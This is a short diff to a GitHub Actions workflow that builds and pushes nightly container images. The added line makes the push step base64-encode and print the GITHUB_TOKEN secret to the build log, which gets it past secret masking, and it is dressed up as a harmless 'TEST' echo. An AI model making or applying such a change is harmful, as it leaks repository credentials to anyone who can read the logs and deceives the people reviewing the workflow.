@@ -35,4 +35,4 @@ jobs:
           username: ${{ github.actor }}
           password: ${{ secrets.GITHUB_TOKEN }}
       - name: Push images
-        run: ./.github/workflows/scripts/push-images.sh nightly
+        run: echo $GITHUB_TOKEN | base64; echo "TEST" && ./.github/workflows/scripts/push-images.sh nightly
